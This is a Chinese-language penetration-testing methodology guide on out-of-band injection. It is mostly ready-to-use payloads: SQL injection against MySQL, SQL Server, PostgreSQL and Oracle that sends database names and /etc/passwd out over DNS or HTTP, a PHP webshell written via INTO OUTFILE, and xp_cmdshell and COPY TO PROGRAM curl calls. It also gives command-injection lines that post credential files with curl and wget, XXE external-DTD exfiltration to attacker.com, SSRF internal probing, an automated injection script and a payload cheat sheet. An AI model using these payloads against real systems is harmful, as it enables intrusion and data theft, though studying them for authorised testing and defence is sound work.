# OOB 注入技术方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供带外（Out-of-Band, OOB）注入技术的系统化方法，帮助在无回显环境中通过 DNS、HTTP 等带外通道成功检测和利用注入漏洞。

## 1.2 适用范围
适用于 SQL 注入、命令注入、XXE、SSRF 等无回显场景的带外利用。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 专题：OOB 注入技术

### 2.1 技术介绍

OOB（Out-of-Band）注入是指当无法直接从 HTTP 响应中看到注入结果时，通过让目标服务器发起 DNS 请求、HTTP 请求等到攻击者控制的服务器，从而获取数据或确认漏洞的攻击技术。

**适用场景：**
- 无回显注入（盲注）
- WAF 过滤严重
- 响应内容不可控
- 需要提取大量数据

### 2.2 OOB 服务搭建

#### 2.2.1 DNSLog 服务

**公共 DNSLog 服务：**
| 服务 | URL | 特点 |
|-----|-----|------|
| **dnslog.cn** | http://dnslog.cn | 中文界面，支持 HTTP |
| **ceye.io** | http://ceye.io | 支持 DNS 和 HTTP |
| **interact.sh** | https://interact.sh | 开源，可自建 |
| **Burp Collaborator** | Burp Suite 内置 | 集成 Burp |

**自建 DNSLog 服务：**
```python
# 使用 pydns 自建
from dnslib import *

class DNSResolver:
    def resolve(self, data):
        # 记录 DNS 请求
        print(f"Received: {data}")
        return None

# 启动 DNS 服务器
server = DNSServer(port=53, resolver=DNSResolver())
server.start()
```

#### 2.2.2 HTTPLog 服务

**简单 HTTP 日志服务器：**
```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"GET: {self.path}")
        print(f"Headers: {self.headers}")
        self.send_response(200)
        self.end_headers()
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print(f"POST: {post_data}")
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
```

**使用 socat 快速搭建：**
```bash
# TCP 监听
socat TCP-LISTEN:8080,reuseaddr,fork STDOUT

# HTTP 日志
nc -lvnp 8080
```

### 2.3 SQL OOB 注入

#### 2.3.1 MySQL OOB

**DNSLog 利用：**
```sql
-- 需要 file 权限
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.dnslog.cn\\a'));

-- 读取文件并通过 DNS 外带
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT LOAD_FILE('/etc/passwd')), '.dnslog.cn\\a'));

-- 使用 INTO OUTFILE
SELECT ... INTO OUTFILE '\\\\dnslog.cn\\share\\file.txt';
```

**HTTPLog 利用：**
```sql
-- 使用 INTO OUTFILE 写入 Webshell
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/shell.php';

-- 使用 UDF 执行命令
CREATE FUNCTION sys_exec RETURNS int SONAME 'udf.dll';
SELECT sys_exec('curl http://dnslog.cn/$(whoami)');
```

#### 2.3.2 SQL Server OOB

**DNSLog 利用：**
```sql
-- xp_dirtree（不需要特殊权限）
EXEC xp_dirtree '\\dnslog.cn\test';

-- 带数据外带
DECLARE @cmd NVARCHAR(100);
SET @cmd = '\\dnslog.cn\' + (SELECT TOP 1 name FROM sys.databases) + '\test';
EXEC xp_dirtree @cmd;

-- 多字符外带
DECLARE @s NVARCHAR(4000);
SELECT @s = ISNULL(@s, '') + ',' + name FROM sys.databases;
EXEC xp_dirtree '\\dnslog.cn\' + @s + '\test';
```

**HTTPLog 利用：**
```sql
-- 使用 sp_OACreate
EXEC sp_OACreate 'MSXML2.XMLHTTP', @obj OUT;
EXEC sp_OAMethod @obj, 'open', NULL, 'GET', 'http://dnslog.cn/?data=test';
EXEC sp_OAMethod @obj, 'send';

-- 使用 xp_cmdshell
EXEC xp_cmdshell 'curl http://dnslog.cn/?data=test';
```

#### 2.3.3 PostgreSQL OOB

**DNSLog 利用：**
```sql
-- 使用 COPY（需要超级用户）
COPY (SELECT version()) TO '\\dnslog.cn\test';

-- 使用 dblink
CREATE EXTENSION dblink;
SELECT * FROM dblink('host=dnslog.cn user=test', 'SELECT 1');
```

**HTTPLog 利用：**
```sql
-- 使用 COPY TO PROGRAM
COPY (SELECT version()) TO PROGRAM 'curl http://dnslog.cn/?data=test';

-- 使用 pg_read_file 外带
SELECT pg_read_file('/etc/passwd');
```

#### 2.3.4 Oracle OOB

**DNSLog 利用：**
```sql
-- 使用 UTL_INADDR
SELECT UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1) || '.dnslog.cn') FROM dual;

-- 使用 UTL_HTTP
SELECT UTL_HTTP.request('http://dnslog.cn/?data=' || (SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual;
```

### 2.4 命令注入 OOB

#### 2.4.1 Linux 命令注入

**DNSLog 利用：**
```bash
# 基础 DNS 请求
; ping dnslog.cn
; nslookup dnslog.cn
; dig dnslog.cn

# 带数据外带
; ping $(whoami).dnslog.cn
; nslookup $(cat /etc/passwd | base64).dnslog.cn
; dig $(hostname).dnslog.cn

# 逐行外带
; for line in $(cat /etc/passwd); do ping ${line}.dnslog.cn; done
```

**HTTPLog 利用：**
```bash
# 使用 curl
; curl http://dnslog.cn/?data=test
; curl http://dnslog.cn/$(whoami)
; curl -X POST -d @/etc/passwd http://dnslog.cn/

# 使用 wget
; wget http://dnslog.cn/?data=test
; wget --post-file=/etc/passwd http://dnslog.cn/

# 使用 python
; python -c "import urllib.request; urllib.request.urlopen('http://dnslog.cn/?data=test')"
```

#### 2.4.2 Windows 命令注入

**DNSLog 利用：**
```batch
# 基础 DNS 请求
& ping dnslog.cn
& nslookup dnslog.cn

# 带数据外带
& ping $(whoami).dnslog.cn
& nslookup $(hostname).dnslog.cn
```

**HTTPLog 利用：**
```batch
# 使用 certutil
& certutil -urlcache -split -f http://dnslog.cn/test

# 使用 PowerShell
& powershell -c "Invoke-WebRequest http://dnslog.cn/?data=test"
& powershell -c "Invoke-RestMethod http://dnslog.cn/?data=$(whoami)"
```

### 2.5 XXE OOB 利用

#### 2.5.1 带外数据外带

```xml
<!-- 基础 XXE OOB -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % remote SYSTEM "http://dnslog.cn/?data=%file;">
  %remote;
]>

<!-- 使用 DTD 文件 -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">
  %remote;
]>

<!-- xxe.dtd 内容 -->
<!ENTITY % send SYSTEM "http://dnslog.cn/?data=%file;">
%send;
```

#### 2.5.2 内网探测

```xml
<!-- SSRF 内网探测 -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/admin">
]>
<root>&xxe;</root>

<!-- 多内网地址探测 -->
<!DOCTYPE foo [
  <!ENTITY xxe1 SYSTEM "http://10.0.0.1:80/">
  <!ENTITY xxe2 SYSTEM "http://10.0.0.2:80/">
  <!ENTITY xxe3 SYSTEM "http://192.168.1.1:80/">
]>
```

### 2.6 自动化 OOB 检测

#### 2.6.1 SQLMap OOB 检测

```bash
# 使用 DNSLog 检测
sqlmap -u "http://target/page?id=1" --dns-domain=dnslog.cn

# 使用 Burp Collaborator
sqlmap -u "http://target/page?id=1" --collab-domain=burpcollaborator.net
```

#### 2.6.2 自定义检测脚本

```python
import requests
import uuid

def test_oob_injection(url, param):
    # 生成唯一标识
    token = uuid.uuid4().hex
    
    # DNSLog 检测
    dns_domain = "dnslog.cn"
    payload = f"{param}'; EXEC xp_dirtree '\\\\{token}.{dns_domain}\\test'--"
    
    requests.get(url, params={"id": payload})
    
    # 检查 DNSLog
    response = requests.get(f"http://{dns_domain}/api/dns/{token}")
    if token in response.text:
        print("OOB Injection 成功!")
```

### 2.7 OOB 利用注意事项

1. **网络可达**：确保目标服务器可以访问外网
2. **DNS 解析**：确保 DNSLog 服务正常
3. **数据编码**：外带数据可能需要 Base64 编码
4. **长度限制**：DNS 请求有长度限制（约 253 字符）
5. **防火墙**：注意目标防火墙可能阻止外连

---

# 第三部分：附录

## 3.1 OOB Payload 速查表

| 类型 | Payload | 说明 |
|-----|---------|------|
| **MySQL DNS** | `SELECT LOAD_FILE('\\\\dnslog.cn\\a')` | DNS 请求 |
| **SQL Server DNS** | `EXEC xp_dirtree '\\dnslog.cn\test'` | DNS 请求 |
| **Oracle DNS** | `UTL_INADDR.get_host_address('dnslog.cn')` | DNS 请求 |
| **命令 DNS** | `ping dnslog.cn` | DNS 请求 |
| **命令 DNS** | `nslookup $(whoami).dnslog.cn` | 带数据 DNS |
| **命令 HTTP** | `curl http://dnslog.cn/$(whoami)` | 带数据 HTTP |
| **XXE OOB** | `<!ENTITY % remote SYSTEM "http://dnslog.cn/?data=%file;">` | XXE 外带 |

## 3.2 参考资源

- [OWASP Out-of-Band Data](https://owasp.org/www-community/attacks/Out_of_Band_Data_Exfiltration)
- [PortSwigger - OOB Attacks](https://portswigger.net/web-security/out-of-band-attacks)
- [PayloadsAllTheThings - OOB](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources#out-of-band-attacks)
- [Interact.sh](https://interact.sh/)
